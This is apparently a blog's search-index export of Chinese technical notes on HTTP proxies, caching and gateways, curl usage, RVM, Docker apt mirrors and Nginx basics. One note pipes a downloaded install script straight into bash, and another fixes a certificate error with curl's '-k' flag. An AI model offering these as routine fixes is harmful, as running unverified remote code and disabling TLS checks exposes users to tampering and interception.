href="#Via-的请求和响应路径" class="headerlink" title="Via 的请求和响应路径"></a>Via 的请求和响应路径</h5><p>请求和响应通常都是通过同一条 TCP 连接传输的，响应报文会沿着与请求报文相同的路径回传。</p><h5 id="Via-与网关"><a href="#Via-与网关" class="headerlink" title="Via 与网关"></a>Via 与网关</h5><p>有些代理会为使用非 HTTP 协议的服务提供网关的功能，Via 首部记录了这些协议转换.</p><h5 id="Server-和-Via-首部"><a href="#Server-和-Via-首部" class="headerlink" title="Server 和 Via 首部"></a>Server 和 Via 首部</h5><p>Server 响应首部字段对原始服务器使用的软件进行了描述:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Server</span>: Apache/<span class="hljs-number">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">14</span> (Unix) PHP/<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h5 id="Via-的隐私和安全问题"><a href="#Via-的隐私和安全问题" class="headerlink" title="Via 的隐私和安全问题"></a>Via 的隐私和安全问题</h5><p>当代理服务器作为网络防火墙的一部分使用时，是不应该转发防火墙后面那些主机的名字和端口号的.</p><p>如果不允许进行 Via 节点名转发，作为安全防线的一部分使用的代理就应该用适当的假名来取代那台主机的名字.</p><h4 id="6-6-2-TRACE-方法"><a href="#6-6-2-TRACE-方法" class="headerlink" title="6.6.2 TRACE 方法"></a>6.6.2 TRACE 方法</h4><p>代理服务器可以在转发报文时对其进行修改，可以添加、修改或删除首部，也可以将主体部分转换称不同的格式.</p><p>通过 HTTP&#x2F;1.1 的 TRACE 方法，用户可以跟踪经代理链传输的请求报文，观察报文经过了哪些代理, 以及每个代理是如何对请求报文进行修改的。</p><p>可以使用 <code>Max-Forwards</code> 首部来限制 TRACE 和 OPTIONS 请求所经过的代替跳数.</p><p><code>Max-Forwards</code> 请求首部字段包含了一个整数，用来说明这条请求报文还可以被转发的次数.</p><p>转发一次, <code>Max-Forwards</code> 后的整数减一。</p><h3 id="6-7-代理认证"><a href="#6-7-代理认证" class="headerlink" title="6.7 代理认证"></a>6.7 代理认证</h3><p>这种机制可以阻止对内容的请求，直到用户向代理提供了有效的访问权限证书为止.</p><h3 id="6-8-代理的互操作性"><a href="#6-8-代理的互操作性" class="headerlink" title="6.8 代理的互操作性"></a>6.8 代理的互操作性</h3><h4 id="6-8-1-处理代理不支持的首部和方法"><a href="#6-8-1-处理代理不支持的首部和方法" class="headerlink" title="6.8.1 处理代理不支持的首部和方法"></a>6.8.1 处理代理不支持的首部和方法</h4><p>代理必须对不认识的首部字段进行转发，而且必须维持同名首部字段的相对顺序.</p><h4 id="6-8-2-OPTIONS-发现对可选特性的支持"><a href="#6-8-2-OPTIONS-发现对可选特性的支持" class="headerlink" title="6.8.2 OPTIONS: 发现对可选特性的支持"></a>6.8.2 OPTIONS: 发现对可选特性的支持</h4><h4 id="6-8-3-Allow-首部"><a href="#6-8-3-Allow-首部" class="headerlink" title="6.8.3 Allow 首部"></a>6.8.3 Allow 首部</h4><p>Allow 实体首部字段列出了请求 URI 标识的资源所支持的方法列表，如果请求 URI 为 <code>*</code> ，列出的就是整个服务器所支持的方法列表.</p><h2 id="第七章-缓存"><a href="#第七章-缓存" class="headerlink" title="第七章 缓存"></a>第七章 缓存</h2><p>Web 缓存是可以自动保存常见文档副本的 HTTP 设备.</p><h3 id="7-1-冗余的数据传输"><a href="#7-1-冗余的数据传输" class="headerlink" title="7.1 冗余的数据传输"></a>7.1 冗余的数据传输</h3><h3 id="7-2-带宽瓶颈"><a href="#7-2-带宽瓶颈" class="headerlink" title="7.2 带宽瓶颈"></a>7.2 带宽瓶颈</h3><h3 id="7-3-瞬间拥塞"><a href="#7-3-瞬间拥塞" class="headerlink" title="7.3 瞬间拥塞"></a>7.3 瞬间拥塞</h3><p>缓存在破坏瞬间拥塞 (Flash Crowds) 时非常重要.</p><h3 id="7-4-距离时延"><a href="#7-4-距离时延" class="headerlink" title="7.4 距离时延"></a>7.4 距离时延</h3><h3 id="7-5-命中和未命中的"><a href="#7-5-命中和未命中的" class="headerlink" title="7.5 命中和未命中的"></a>7.5 命中和未命中的</h3><p>用已有的副本为某些到达缓存的请求提供服务，被称为<mark>缓存命中</mark> (cache hit).</p><p>到达缓存的请求可能会由于没有副本可用，而被转发给原始服务器，被称为<mark>缓存未命中</mark> (cache miss)</p><h4 id="7-5-1-再验证"><a href="#7-5-1-再验证" class="headerlink" title="7.5.1 再验证"></a>7.5.1 再验证</h4><p>缓存需对它们保存的副本进行检测，判断是否为服务器上的最新副本。这被称为<mark>HTTP 再验证</mark> (revalidaion).</p><p>大部分缓存只有在客户端发起请求，并且副本旧得足以需要检测的时候，才会对副本进行 revalidation.</p><p>使用 <code>If-Modified-Since</code> 首，告诉服务器，只有在缓存了对象的副本之后，又对其进行了修改下，才发送此对象.</p><h4 id="7-5-2-命中率"><a href="#7-5-2-命中率" class="headerlink" title="7.5.2 命中率"></a>7.5.2 命中率</h4><p>由缓存提供服务的请求所占的比例被称为<mark>缓存命中率</mark> (cache hit rate).</p><h4 id="7-5-3-字节命中率"><a href="#7-5-3-字节命中率" class="headerlink" title="7.5.3 字节命中率"></a>7.5.3 字节命中率</h4><p>字节命中率表示的是缓存提供的字节在传输的所有字节中所占的比例。</p><h4 id="7-5-4-区分命中和未命中的情况"><a href="#7-5-4-区分命中和未命中的情况" class="headerlink" title="7.5.4 区分命中和未命中的情况"></a>7.5.4 区分命中和未命中的情况</h4><p>客户端可以通过 <code>Date</code> 首部来判断响应是否来自缓存，将 <code>Date</code> 首部的值与当前时间进行比较，如果响应中的日期值比较早，客户端通常就可以认为这是一条缓存的响应.</p><h3 id="7-6-缓存的拓扑结构"><a href="#7-6-缓存的拓扑结构" class="headerlink" title="7.6 缓存的拓扑结构"></a>7.6 缓存的拓扑结构</h3><p>缓存可以是单个用户专用的，也可以是数千名用户共享的。</p><p>专用缓存被称为<mark>私有缓存</mark> (private cache).</p><p>共享的缓存被称为<mark>公有缓存</mark> (public cache).</p><h4 id="7-6-1-私有缓存"><a href="#7-6-1-私有缓存" class="headerlink" title="7.6.1 私有缓存"></a>7.6.1 私有缓存</h4><p>Web 浏览器中有内建的私有缓存。</p><h4 id="7-6-2-公有代理缓存"><a href="#7-6-2-公有代理缓存" class="headerlink" title="7.6.2 公有代理缓存"></a>7.6.2 公有代理缓存</h4><p>公有缓存是特殊的共享代理服务器, 被称为<mark>缓存代理服务器</mark> (caching proxy server).</p><h4 id="7-6-3-代理缓存的层次结构"><a href="#7-6-3-代理缓存的层次结构" class="headerlink" title="7.6.3 代理缓存的层次结构"></a>7.6.3 代理缓存的层次结构</h4><p><img src="/../img/%E7%BC%93%E5%AD%98%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="缓存层次结构"></p><h4 id="7-6-4-网状缓存-x2F-内容路由以及对等缓存"><a href="#7-6-4-网状缓存-x2F-内容路由以及对等缓存" class="headerlink" title="7.6.4 网状缓存&#x2F;内容路由以及对等缓存"></a>7.6.4 网状缓存&#x2F;内容路由以及对等缓存</h4><p>有些网络结构会构建复杂的<mark>网状缓存</mark> (cache mesh).</p><p>一种代理缓存会决定选择何种路由对内容进行访问、管理和传送，因此可将其称为<mark>内容路由</mark> (content router).</p><p>缓存之间这些更为复杂的关系允许不同的组织互为对等 (peer) 实体，将它们的缓存连接起来以实现共赢。</p><p>提供可选的对等支持的缓存被称为<mark>兄弟缓存</mark> (sibling cache).</p><h3 id="7-7-缓存的处理步骤"><a href="#7-7-缓存的处理步骤" class="headerlink" title="7.7 缓存的处理步骤"></a>7.7 缓存的处理步骤</h3><p>对一条 HTTP GET 报文的基本缓存处理过程包括7个步骤:</p><ol><li>接受</li><li>解析</li><li>查询</li><li>新鲜度检测</li><li>创建响应</li><li>发送</li><li>日志</li></ol><p><img src="/../img/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%AA%E6%96%B0%E9%B2%9C%E7%9A%84%E7%BC%93%E5%AD%98%E5%91%BD%E4%B8%AD.png" alt="处理一个新鲜的缓存命中"></p><h3 id="7-8-保持副本的新鲜"><a href="#7-8-保持副本的新鲜" class="headerlink" title="7.8 保持副本的新鲜"></a>7.8 保持副本的新鲜</h3><h4 id="7-8-1-文档过期"><a href="#7-8-1-文档过期" class="headerlink" title="7.8.1 文档过期"></a>7.8.1 文档过期</h4><p>通过特殊的 HTTP Cache-Control 首部和 Expires 首部，HTTP 让原始服务器向每个文档附加了一个 “过期日期”. 这些首部说明了在多长时间内可以将这些内容视为新鲜的。</p><p>在缓存文档过期之前，缓存可以以任意频率使用这些副本，而无需与服务器联系.</p><h4 id="7-8-2-过期日期和使用期"><a href="#7-8-2-过期日期和使用期" class="headerlink" title="7.8.2 过期日期和使用期"></a>7.8.2 过期日期和使用期</h4><p>Expires 首部使用绝对日期.</p><p>Cache-Control: max-age 首部使用相对时间 (以秒为单位).</p><h4 id="7-8-3-服务器再验证"><a href="#7-8-3-服务器再验证" class="headerlink" title="7.8.3 服务器再验证"></a>7.8.3 服务器再验证</h4><p>已缓存文档过期意味着到了要和服务器进行核对的时间，这种情况被称为 <mark>“服务器再验证”</mark>.</p><h4 id="7-8-4-用条件方法进行再验证"><a href="#7-8-4-用条件方法进行再验证" class="headerlink" title="7.8.4 用条件方法进行再验证"></a>7.8.4 用条件方法进行再验证</h4><p>HTTP 允许缓存向原始服务器发送一个 “条件 GET” , 请求服务器只有在文档与缓存中现有的副本不同时，才回送对象主体.</p><p>HTTP 定义了 5 个条件请求首部,对缓存再验证来说最有用的 2 个首部是:</p><ul><li>If-Modified-Since</li><li>If-None-Match</li></ul><p>所有的条件首部都以前缀 “If-“ 开头.j w</p><h4 id="7-8-7-强弱验证器"><a href="#7-8-7-强弱验证器" class="headerlink" title="7.8.7 强弱验证器"></a>7.8.7 强弱验证器</h4><p>实体标签和最近修改日期都是<mark>缓存验证器</mark> (cache validator).</p><p>弱验证器允许对一些内容进行修改.</p><h4 id="7-8-8-什么时候使用实体标签和最近修改日期"><a href="#7-8-8-什么时候使用实体标签和最近修改日期" class="headerlink" title="7.8.8 什么时候使用实体标签和最近修改日期"></a>7.8.8 什么时候使用实体标签和最近修改日期</h4><h3 id="7-9-控制缓存的能力"><a href="#7-9-控制缓存的能力" class="headerlink" title="7.9 控制缓存的能力"></a>7.9 控制缓存的能力</h3><h2 id="第8章-集成点-网关、隧道及中继"><a href="#第8章-集成点-网关、隧道及中继" class="headerlink" title="第8章 集成点: 网关、隧道及中继"></a>第8章 集成点: 网关、隧道及中继</h2><h3 id="8-1-网关"><a href="#8-1-网关" class="headerlink" title="8.1 网关"></a>8.1 网关</h3><p>网关 (gateway) 可以作为某种翻译器使用。</p><p>有些网关会自动将 HTTP 流量转换为其他协议，这样 HTTP 客户端无需了解其他协议，就可以与其他应用程序进行交互了。</p><h4 id="客户端和服务器端网关"><a href="#客户端和服务器端网关" class="headerlink" title="客户端和服务器端网关"></a>客户端和服务器端网关</h4><p>Web 网关在一侧使用 HTTP 协议，在另一侧使用另一种协议.</p><p>可以用一个斜杠来分隔客户端和服务器端协议，并以此对网关进行描述:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">客户端协议</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">服务器端协议</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="8-2-协议网关"><a href="#8-2-协议网关" class="headerlink" title="8.2 协议网关"></a>8.2 协议网关</h3><p>将 HTTP 流量导向网关时所使用的的方式与流量导向代理的方式相同。</p><h4 id="8-2-1-HTTP-x2F-服务器端-Web-网关"><a href="#8-2-1-HTTP-x2F-服务器端-Web-网关" class="headerlink" title="8.2.1 HTTP&#x2F;*: 服务器端 Web 网关"></a>8.2.1 HTTP&#x2F;*: 服务器端 Web 网关</h4><p>请求流入原始服务器时，服务器端 Web 网关会将客户端 HTTP 请求转换为其他协议.</p><h4 id="8-2-2-HTTP-x2F-HTTPS-服务器端安全网关"><a href="#8-2-2-HTTP-x2F-HTTPS-服务器端安全网关" class="headerlink" title="8.2.2 HTTP&#x2F;HTTPS: 服务器端安全网关"></a>8.2.2 HTTP&#x2F;HTTPS: 服务器端安全网关</h4><p>一个组织可以通过网关对所有输入 Web 的请求加密，以提供额外的隐私和安全性保护.</p><h4 id="8-2-3-HTTPS-x2F-HTTP-客户端安全加速器网关"><a href="#8-2-3-HTTPS-x2F-HTTP-客户端安全加速器网关" class="headerlink" title="8.2.3 HTTPS&#x2F;HTTP 客户端安全加速器网关"></a>8.2.3 HTTPS&#x2F;HTTP 客户端安全加速器网关</h4><p>它们接受安全的 HTTPS 流量,对安全流量进行解密,并向 Web 服务器发送普通的 HTTP 请求.</p><p>这些网关中通常包含专用的解密硬件.</p><h3 id="8-3-资源网关"><a href="#8-3-资源网关" class="headerlink" title="8.3 资源网关"></a>8.3 资源网关</h3><p>最常见的网关, 应用程序服务器, 会将目标服务器与网关结合在一个服务器中实现.</p><p>CGI (Common Gateway Interface), 通用网关接口, 其为一个标准接口集, Web 服务器可以用它来装载程序以响应对特定 URL 的 HTTP 请求,并收集程序的输出数据,将其放在 HTTP 响应中回送.</p><p>服务器和网关是相互独立的应用程序.</p><h4 id="8-3-1-CGI"><a href="#8-3-1-CGI" class="headerlink" title="8.3.1 CGI"></a>8.3.1 CGI</h4><p>CGI 应用程序是独立于服务器的,几乎可以用任意语言来实现.</p><p>CGI 很简单, 几乎所有的 HTTP 服务器都支持它.</p><p>CGI 应用程序对用户来说是不可见的.</p><h4 id="8-3-2-服务器扩展-API"><a href="#8-3-2-服务器扩展-API" class="headerlink" title="8.3.2 服务器扩展 API"></a>8.3.2 服务器扩展 API</h4><p>CGI 协议为外部翻译器与现有的 HTTP 服务提供了一种简洁的接口方式.</p><p>扩展 API 允许程序员将自己的代码嫁接到服务器上,或者用自己的代码将服务器的一个组件完整地替换出来.</p><h3 id="8-4-应用程序接口和-Web-服务器"><a href="#8-4-应用程序接口和-Web-服务器" class="headerlink" title="8.4 应用程序接口和 Web 服务器"></a>8.4 应用程序接口和 Web 服务器</h3><p>HTTP 可以作为一种连接应用程序的基础软件来使用.</p><p>应用程序之间要配合工作，所要交互的信息比 HTTP 首部所能表达的信息要复杂得多。</p><h3 id="8-5-隧道"><a href="#8-5-隧道" class="headerlink" title="8.5 隧道"></a>8.5 隧道</h3><p>HTTP 的另一种用法 – Web 隧道 (Web tunnel), 这种方式可以通过 HTTP 应用程序访问使用非 HTTP 协议的应用程序。</p><p>Web 隧道允许用户通过 HTTP 链接发送非 HTTP 流量.</p><p>使用 Web 隧道最常见的原因就是要在 HTTP 连接中嵌入非 HTTP 流量，这样，这类流量就可以穿过只允许 Web 流量通过的防火墙了.</p><h4 id="8-5-1-用-CONNECT-建立-HTTP-隧道"><a href="#8-5-1-用-CONNECT-建立-HTTP-隧道" class="headerlink" title="8.5.1 用 CONNECT 建立 HTTP 隧道"></a>8.5.1 用 CONNECT 建立 HTTP 隧道</h4>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 库 shadowsocks 使用</title>
    <link href="/2022/08/29/Python-%E5%BA%93-shadowsocks-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/29/Python-%E5%BA%93-shadowsocks-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>curl 命令笔记</title>
    <link href="/2022/08/29/curl-%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/29/curl-%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://curl.se/">官网</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>curl 全称为 CommandLine Uniform Resource Locator, 即 CommandLine url. 可用于数据和文件的传输。</p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>一般语法为:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ curl <span class="hljs-comment">[-参数]</span> <span class="hljs-comment">[URL]</span><br></code></pre></td></tr></table></figure><h2 id="获取一个界面"><a href="#获取一个界面" class="headerlink" title="获取一个界面"></a>获取一个界面</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> www.baidu.com<br></code></pre></td></tr></table></figure><p>未指定所用协议，curl 会智能选择。其返回页面的 HTML 代码。</p><h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><h3 id="v-–verbose"><a href="#v-–verbose" class="headerlink" title="-v –verbose"></a>-v –verbose</h3><p>用于跟踪 url 的连接信息。</p><p>返回的信息包含: 域名解释过程，请求头信息 (request)，回应头信息 (response) 等.</p><h3 id="i-–include"><a href="#i-–include" class="headerlink" title="-i –include"></a>-i –include</h3><p>和 <code>-v</code> 选项类似，是其子集。在输出信息中包含 HTTP 头信息。</p><h3 id="I-–head"><a href="#I-–head" class="headerlink" title="-I –head"></a>-I –head</h3><p>和 <code>-v</code> 选项类似，是其子集。只显示返回的头信息。</p><h3 id="u-–user"><a href="#u-–user" class="headerlink" title="-u –user"></a>-u –user</h3><p>带用户验证的连接.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -u username:password https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<br></code></pre></td></tr></table></figure><h3 id="d-–data"><a href="#d-–data" class="headerlink" title="-d –data"></a>-d –data</h3><p>带请求参数的连接:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -d <span class="hljs-string">&#x27;user=xiaoruan&amp;age=22&#x27;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/index.html<br></code></pre></td></tr></table></figure><p>实际为 <code>http://127.0.0.1/index.html?user=xiaoruan&amp;age=22</code></p><h3 id="X-–request"><a href="#X-–request" class="headerlink" title="-X –request"></a>-X –request</h3><p>指定请求方式:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-XGET</span> www.baidu.com<br><span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-XPOST</span> www.baidu.com<br></code></pre></td></tr></table></figure><h3 id="H-–header"><a href="#H-–header" class="headerlink" title="-H –header"></a>-H –header</h3><p>自定义请求头:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -i -H <span class="hljs-string">&#x27;ACCEPT: application/json&#x27;</span> -d <span class="hljs-string">&#x27;name=Foo&amp;status=Bar&#x27;</span> http://localhost:49160/json</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>指定版本 安装 Ruby</title>
    <link href="/2022/08/29/%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC-%E5%AE%89%E8%A3%85-Ruby/"/>
    <url>/2022/08/29/%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC-%E5%AE%89%E8%A3%85-Ruby/</url>
    
    <content type="html"><![CDATA[<p>通过 <code>RVM</code> 安装，RVM 即 Ruby Version Manager, 是 Ruby 版本及安装工具。</p><p>安装 rvm:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -L https:<span class="hljs-regexp">//g</span>et.rvm.io | bash -s stable<br></code></pre></td></tr></table></figure><p>验证 rvm 是否安装正确:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>rvm -v<br></code></pre></td></tr></table></figure><p>安装指定版本的 Ruby:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ rvm <span class="hljs-keyword">install</span> <span class="hljs-number">2.0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>查看:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>rvm list<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决 curl: (60) ssl certificate problem certificate has expired 问题</title>
    <link href="/2022/08/29/%E8%A7%A3%E5%86%B3-curl-60-ssl-certificate-problem-certificate-has-expired-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/29/%E8%A7%A3%E5%86%B3-curl-60-ssl-certificate-problem-certificate-has-expired-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>根据报错添加 <code>-k</code> 参数即可:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">curl -k</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>本机端口的使用</title>
    <link href="/2022/08/29/%E6%9C%AC%E6%9C%BA%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/29/%E6%9C%AC%E6%9C%BA%E7%AB%AF%E5%8F%A3%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>例如在容器中对外打开 80 端口，其映射到宿主机的 49153 端口，即 <code>0.0.0.0:49153-&gt;80/tcp</code>，那么可以在浏览器使用 <code>localhost:49153/</code> 来打开。</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决在 Docker 中换源后 No system certificates available. Try installing ca-certificates 问题</title>
    <link href="/2022/08/28/%E8%A7%A3%E5%86%B3%E5%9C%A8-Docker-%E4%B8%AD%E6%8D%A2%E6%BA%90%E5%90%8E-No-system-certificates-available-Try-installing-ca-certificates-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/28/%E8%A7%A3%E5%86%B3%E5%9C%A8-Docker-%E4%B8%AD%E6%8D%A2%E6%BA%90%E5%90%8E-No-system-certificates-available-Try-installing-ca-certificates-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pkgs.org/download/ca-certificates">下载证书的网站</a><br><a href="https://installati.one/ubuntu/20.04/ca-certificates/">参考</a><br>先用原本的仓库安装 <code>ca-certificates</code> (若先换了源, 就会找不到安装包):</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> -y install ca-certificates<br></code></pre></td></tr></table></figure><p>然后再换源和更新:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sed</span> -i <span class="hljs-string">&quot;s<span class="hljs-variable">@http</span>://.*archive.ubuntu.com<span class="hljs-variable">@https</span>://mirrors.tuna.tsinghua.edu.cn<span class="hljs-variable">@g</span>&quot;</span> /etc/apt/sources.list<br>sed -i <span class="hljs-string">&quot;s<span class="hljs-variable">@http</span>://.*security.ubuntu.com<span class="hljs-variable">@https</span>://mirrors.tuna.tsinghua.edu.cn<span class="hljs-variable">@g</span>&quot;</span> /etc/apt/sources.list<br>apt-get update<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx 知识点</title>
    <link href="/2022/08/28/Nginx-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/08/28/Nginx-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.nginx.cn/doc/">中文文档</a></p><p><a href="https://nginx.org/en/docs/">英文文档</a></p><p><a href="http://nginx.org/en/docs/">官网相关教程和资料</a></p><p>参考书籍: &lt;&lt;Nginx 服务器架构初探&gt;&gt;, &lt;&lt;Nginx-高性能-Web-服务器详解&gt;&gt;, &lt;&lt;Nginx-高性能-Web-服务器实战教程&gt;&gt;, &lt;&lt;高性能 Linux 服务器 构建实战&gt;&gt;</p><p><a href="https://wiki.archlinux.org/title/Nginx">ArchWiki 上相关资料</a></p><p><a href="https://www.digitalocean.com/community/tutorials/understanding-the-nginx-configuration-file-structure-and-configuration-contexts">谷歌找到的文档</a></p><p><a href="https://www.zhihu.com/question/502134901/answer/2598585626?utm_medium=social&utm_oi=1215946114580484096&utm_psn=1559612920740134912&utm_source=qq">知乎查询资料</a></p><h1 id="一些理论概念"><a href="#一些理论概念" class="headerlink" title="一些理论概念"></a>一些理论概念</h1><h2 id="同步和异步，阻塞和非阻塞"><a href="#同步和异步，阻塞和非阻塞" class="headerlink" title="同步和异步，阻塞和非阻塞"></a>同步和异步，阻塞和非阻塞</h2><h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><ul><li>同步, 当一个同步调用发出去后，调用者要一直等待调用的结果通知后，才能进行后续的执行</li><li>异步，当一个异步调用发出去后，调用者不需要一直等待调用结果的返回，其想要获取调用结果一般采取两种方式<ol><li>主动轮询异步调用结果</li><li>被调用方通过 callback 来通知</li></ol></li></ul><h3 id="阻塞和非阻塞"><a href="#阻塞和非阻塞" class="headerlink" title="阻塞和非阻塞"></a>阻塞和非阻塞</h3><ul><li>阻塞，调用在发出后，在消息返回前，当前线&#x2F;进程会被挂起，直到有消息返回，当前线&#x2F;进程才会被激活</li><li>非阻塞，调用在发出去后，不会阻塞当前线&#x2F;进程，而会立即返回</li></ul><p>nginx 采用异步非阻塞方式工作。</p><h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><p>当连接有 I&#x2F;O 产生时，epoll 就会告诉进程哪个连接有 I&#x2F;O 事件，然后进程就会去处理这个事件。其让 nginx 有高并发, 即同时处理多个连接.</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>nginx (engine x) 是一个高性能的 HTTP 和反向代理服务器, 同时也提供 IMAP 和 SMTP 服务。其特点是占用内存少，并发能力强。</p><h2 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h2><p>两种工作模式.</p><h3 id="master-worker-模式"><a href="#master-worker-模式" class="headerlink" title="master-worker 模式"></a>master-worker 模式</h3><p>有一个 master 进程和至少一个 worker 进程。</p><p>master 进程负责处理系统信号，管理 worker 进程。</p><p>worker 进程负责处理具体的业务逻辑。</p><p>常用于生产环境。</p><h3 id="单进程模式"><a href="#单进程模式" class="headerlink" title="单进程模式"></a>单进程模式</h3><p>只有一个进程.</p><p>方便使用 gdb 等工具进行调试。</p><p>一般用于开发阶段和调试。</p><p>Nginx 读作 engine X, 可以做 HTTP 服务器, 反向代理, IMAP&#x2F;POP3 代理服务器.</p><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><p>Nginx 可以通过模块来扩展功能. 就像 vim 装插件.</p><p>一般分为:</p><ul><li>核心模块</li><li>标准 HTTP 模块</li><li>可选 HTTP 模块</li><li>邮件服务模块</li><li>第三方模块</li></ul><p>添加的模块根据实际情况调整.</p><p>核心模块和标准 HTTP 模块在 Nginx 快速编译后就包含在 Nginx 中.</p><p>在我装得 docker 容器 (Ubuntu 18.04) 里, 模块位于 <code>/usr/lib/nginx/modules</code> 这个目录.</p><h2 id="功能-使用方向"><a href="#功能-使用方向" class="headerlink" title="功能, 使用方向"></a>功能, 使用方向</h2><h3 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h3><p>正向代理, 代理客户端. 客户端的请求从代理处发给服务器.</p><p>反向代理, 代理服务端. 就如同向我们向 <code>www.baidu.com</code> 访问, 只有这一个域名, 实际上后面有很多服务器.</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>轮循, 一个一个分配请求.</p><p>加权轮循, 通过权重来分配请求.</p><h3 id="iphash"><a href="#iphash" class="headerlink" title="iphash"></a>iphash</h3><p>来自一个 ip 的请求会始终传送到同一个服务器上 (解决会话无法共享导致的问题).</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>做缓存服务器以及 Session 共享.</p><h3 id="静态资源服务器"><a href="#静态资源服务器" class="headerlink" title="静态资源服务器"></a>静态资源服务器</h3><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装 